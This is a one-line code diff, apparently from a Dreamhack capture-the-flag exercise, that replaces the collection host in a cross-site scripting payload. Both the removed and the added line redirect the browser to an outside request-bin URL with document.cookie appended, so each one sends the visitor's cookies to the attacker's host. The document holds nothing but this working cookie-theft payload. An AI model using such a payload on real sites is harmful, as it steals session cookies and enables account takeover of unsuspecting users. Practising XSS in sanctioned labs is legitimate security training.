@@ -1,1 +1,1 @@
-location.href="https://kfkidmk.request.dreamhack.games/?="+document.cookie;
+location.href="https://uazkody.request.dreamhack.games/?="+document.cookie;
